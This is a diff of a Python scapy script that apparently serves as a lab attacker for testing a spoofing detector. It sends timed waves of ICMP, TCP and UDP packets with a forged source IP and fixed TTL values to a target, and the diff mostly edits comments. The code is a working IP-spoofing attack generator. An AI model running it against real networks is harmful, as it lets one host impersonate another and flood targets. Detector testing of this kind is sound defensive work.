@@ -1,11 +1,8 @@
 #!/usr/bin/env python3
 """
-attack_hardcoded_nomarker.py - Deterministic IP-spoofing test attacker (no markers)
 
-- Hard-coded TTL sequences per wave (deterministic).
 - Prints only wave headers, coarse progress, and a TTL-distribution summary per wave.
 - Uses SPOOFED_IP as the packet source so it actually spoofs the client IP.
-- No marker packets, no randomness, no wave 4.
 
 Usage:
   - Adjust INTERFACE_USED, REAL_ATTACKER_IP, TARGET_IP, SPOOFED_IP to match your lab.
@@ -16,7 +13,7 @@ import time
 from scapy.all import IP, UDP, TCP, ICMP, send, conf
 
 # ---------------- CONFIG ----------------
-INTERFACE_USED = "\\Device\\NPF_Loopback"   # xact name from scapy.show_interfaces()
+INTERFACE_USED = "\\Device\\NPF_Loopback"   # copy exact name from scapy.show_interfaces()
 REAL_ATTACKER_IP = "10.1.1.30"              # attacker machine real IP (unused for spoofed pkts)
 TARGET_IP = "10.1.1.10"                     # detector / victim IP
 SPOOFED_IP = "10.1.1.20"                    # impersonated legitimate client IP
@@ -49,7 +46,7 @@ def build_pkt(spoofed_src, dst, ttl, pkt_type):
 
 def launch():
     conf.iface = INTERFACE_USED
-    print("=== HARD-CODED ATTACKER (NO MARKER) STARTED ===")
+    print("===ATTACKER STARTED ===")
     print(f"Interface: {INTERFACE_USED}")
     print(f"Real attacker IP: {REAL_ATTACKER_IP}")
     print(f"Target: {TARGET_IP} | Spoofing as: {SPOOFED_IP}\n")
@@ -68,23 +65,24 @@ def launch():
             name, count, inter_delay, ttl_list, pkt_type = wave
             print(f"\n--- WAVE {wave_idx}: {name} ---")
             sent_in_wave = 0
-          
+
+            # prepare deterministic pkt-type cycle for MIXED
             mixed_seq = ["TCP", "UDP", "ICMP"]
 
             # compute progress interval to avoid printing each packet
             progress_interval = max(1, count // PROGRESS_STEPS)
 
             for i in range(count):
-        
+                # deterministic TTL selection (cycled through ttl_list)
                 ttl = ttl_list[i % len(ttl_list)]
 
-            
+                # pick packet type deterministically
                 if pkt_type == "MIXED":
                     ptype = mixed_seq[i % len(mixed_seq)]
                 else:
                     ptype = pkt_type
 
-                # construct packet using spoofed source (eto yung actual spoof)
+                # construct packet using spoofed source (this is the actual spoof)
                 pkt = None
                 if ptype == "ICMP":
                     pkt = IP(src=SPOOFED_IP, dst=TARGET_IP, ttl=ttl)/ICMP()
@@ -103,7 +101,7 @@ def launch():
 
                 time.sleep(inter_delay)
 
-            # wave TTL distribution summary
+            # wave TTL distribution summary (deterministic)
             dist = {}
             for i in range(count):
                 t = ttl_list[i % len(ttl_list)]
@@ -126,4 +124,3 @@ def launch():
 
 if __name__ == "__main__":
     launch()
-
